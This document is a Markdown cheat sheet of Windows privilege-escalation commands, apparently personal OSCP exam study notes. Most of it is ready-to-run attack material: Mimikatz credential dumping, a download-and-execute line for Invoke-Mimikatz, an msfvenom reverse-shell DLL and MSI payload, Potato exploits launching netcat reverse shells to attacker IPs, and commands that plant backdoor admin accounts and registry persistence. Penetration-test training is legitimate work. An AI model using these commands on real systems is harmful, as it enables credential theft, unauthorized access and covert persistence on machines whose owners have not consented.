# Automated Enumeration
## PowerShell Tee 
Useful for running these long-running enumeration programs -- writes output to file while allowing real-time review.
```powershell
| Tee-Object -FilePath "output.txt"
```

## PrivescCheck (Source)
```
https://github.com/itm4n/PrivescCheck
```
Supposedly cleaner output than WinPEAS

## PrivescCheck (Run)
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```


## PowerUp.ps1 (Kali Source)
Checks for privilege escalation vectors. **Offers cmdlets to also abuse vulnerabilities, but should be avoided on the OSCP, as they may be considered a violation of the no "auto-exploit" rule.**
https://blog.certcube.com/powerup-cheatsheet/

Source: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```

## PowerUp AllChecks
```powershell
Invoke-AllChecks
```

## WinPEAS (Kali Source)
Fundamental for OSCP. Always run and read output thoroughly.
Source: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```
/usr/share/peass/winpeas/winPEASx64.exe
```

# Manual Context Gathering

## Display current user and all privileges
```cmd
whoami /all
```

## List all local users
```cmd
net user 
```

## Get details for specific user
```powershell
net user administrator
```

## List all local groups
``` cmd
net localgroup
```
## List all local groups
```powershell
Get-LocalGroup
```

## List members of Administrators group
```cmd
net localgroup Administrators
```
## List members of Administrators group
```powershell
Get-LocalGroupMember Administrators
```

## Display system information
```powershell
systeminfo
```

## Display network configuration
```powershell
ipconfig /all
```

## Show routing table
```powershell
route print
```

## List active network connections
```powershell
netstat -ano
```

## Check C:\
Look for unusual folders under C:\ and C:\Temp.

## List installed programs from 32-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List installed programs from 64-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List all running processes
```powershell
Get-Process
```

## List all running processes
```cmd
tasklist /v
```

## List processes with command line arguments
```powershell
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine
wmic process get name,processid,commandline
```

# Credential Hunting

## LaZagne
Automated tool for finding insecurely cached credentials.
```
https://github.com/AlessandroZ/LaZagne
```

## PowerShell Get-ChildItem Credential Hunting
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
```
- Attempt to run, or download and use `strings` on unusual executables

## Get PowerShell command history
```powershell
Get-History
```

## Get PSReadline history file path
```powershell
(Get-PSReadlineOption).HistorySavePath
```

## Find PSReadline history for all users
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
```
## Check for autologon credentials in registry
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
## Search for VNC passwords in registry
```cmd
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server
```

## List saved credentials
```cmd
cmdkey /list
```

# Credential Harvesting (Requires local admin)
## Mimikatz (Kali Source)
```
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

## Mimikatz extract logon passwords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
```

## Run Mimikatz to extract WDigest credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

## Run Mimikatz to extract MSV credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
```

## Run Mimikatz to dump cached credentials
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

## Run Mimikatz to dump SAM hashes
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

## Run Invoke-Mimikatz PowerShell version
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

# Service Enumeration
## List all services
```powershell
Get-Service
```

## List all services
```cmd
sc query state=all
```

## List services with full path
```powershell
Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,displayname,pathname,startmode
```

## Find unquoted service paths with spaces
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Find unquoted service paths 
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
```

## Find unquoted services with PowerUp
```powershell
Get-UnquotedService
```

## Find modifiable service binaries with PowerUp
```
. .\PowerUp.ps1
Get-ModifiableServiceFile
```


Start/stop a service, foo, to replace its binary with a malicious one
`net stop foo`
`net start foo`

# DLL Hijacking
## Create malicious DLL with msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
```

# Scheduled Tasks
## List all scheduled tasks
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

## Find writable scheduled task binaries
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Check for AlwaysInstallElevated registry keys
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Create MSI payload for AlwaysInstallElevated
```bash
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
```

## Install MSI silently
```cmd
msiexec /quiet /qn /i evil.msi
```

## Check registry autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Check startup folder permissions
```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```


# User Account Privileges
- SeImpersonatePrivilege or SeAssignPrimaryToken
	- If we have either of these privileges, refer to the Potato exploit series: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
	- Try Sweet Potato first (stabler than GodPotato)

## SweetPotato (Source)
First choice to due to coverage of wide range of Windows versions.
Compile in Windows VM with Visual Studio.
```
https://github.com/CCob/SweetPotato
```

## SweetPotato (nc shell)
```cmd
.\SweetPotato.exe -p .\nc.exe -a "192.168.45.196 4440 -e cmd.exe"
```


## Rogue Potato (Source). For >= Windows 10 1809 & Windows Server 2019
```
https://github.com/antonioCoco/RoguePotato
```

## Rogue Potato (nc shell)
```
.\RoguePotato.exe -r 192.168.45.246 -e "C:\users\chris\downloads\nc.exe 192.168.45.246 4441 -e cmd.exe" -l 9999
```


## PrintSpoofer (Source)
```
https://github.com/itm4n/PrintSpoofer
```

## Run PrintSpoofer for Windows Server 2016/2019
```cmd
.\PrintSpoofer64.exe -i -c "whoami"
```

## Run JuicyPotato for older Windows versions
```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *
```

## Create new local administrator
```cmd
net user Administrator2 Password123! /add
net localgroup administrators Administrator2 /add
```

## Create service backdoor
```cmd
sc create evil binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc start evil
```

## Add registry persistence
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\temp\backdoor.exe"
```

---

# Reference

For extended reference (token impersonation tool comparison, database syntax), see [[Windows PrivEsc Reference]]

**Use [[CHECKLIST-Windows-Privesc]] to ensure you don't skip enumeration steps.**
